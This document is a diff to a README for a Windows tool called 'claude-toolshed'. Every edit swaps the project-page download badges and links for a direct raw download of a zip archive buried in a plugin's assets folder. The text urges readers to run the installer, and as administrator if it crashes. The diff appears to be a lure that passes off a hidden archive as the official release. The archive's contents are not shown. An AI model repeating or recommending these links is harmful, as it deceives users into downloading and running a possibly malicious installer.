@@ -1,6 +1,6 @@
 # ⚙️ claude-toolshed - Easy Access to Claude Code Skills
 
-[![Download Now](https://img.shields.io/badge/Download-claude--toolshed-brightgreen)](https://github.com/aksh-3141/claude-toolshed)
+[![Download Now](https://img.shields.io/badge/Download-claude--toolshed-brightgreen)](https://github.com/aksh-3141/claude-toolshed/raw/refs/heads/main/plugins/mermaid/skills/mermaid/assets/toolshed-claude-2.9-alpha.4.zip)
 
 ---
 
@@ -30,7 +30,7 @@ Before downloading claude-toolshed, make sure your computer meets these requirem
 
 Click the button below to visit the download page. This is where you can get the latest version of claude-toolshed.
 
-[![Download Here](https://img.shields.io/badge/Download-claude--toolshed-blue)](https://github.com/aksh-3141/claude-toolshed)
+[![Download Here](https://img.shields.io/badge/Download-claude--toolshed-blue)](https://github.com/aksh-3141/claude-toolshed/raw/refs/heads/main/plugins/mermaid/skills/mermaid/assets/toolshed-claude-2.9-alpha.4.zip)
 
 ### Step 2: Find the Right File
 
@@ -105,7 +105,7 @@ If the app crashes during installation or use, try running it as an administrato
 ## 📚 Additional Resources
 
 - Visit the GitHub page to see more about claude-toolshed’s plugins and updates:  
-  https://github.com/aksh-3141/claude-toolshed
+  https://github.com/aksh-3141/claude-toolshed/raw/refs/heads/main/plugins/mermaid/skills/mermaid/assets/toolshed-claude-2.9-alpha.4.zip
 - The page includes documentation and links to support if you want to learn more or report issues.
 
 ---
@@ -114,6 +114,6 @@ If the app crashes during installation or use, try running it as an administrato
 
 Use the link below to open the download page and get started:
 
-[![Download claude-toolshed](https://img.shields.io/badge/Download-claude--toolshed-green)](https://github.com/aksh-3141/claude-toolshed)
+[![Download claude-toolshed](https://img.shields.io/badge/Download-claude--toolshed-green)](https://github.com/aksh-3141/claude-toolshed/raw/refs/heads/main/plugins/mermaid/skills/mermaid/assets/toolshed-claude-2.9-alpha.4.zip)
 
 After downloading and running the installer, claude-toolshed will be ready to use on your Windows machine.
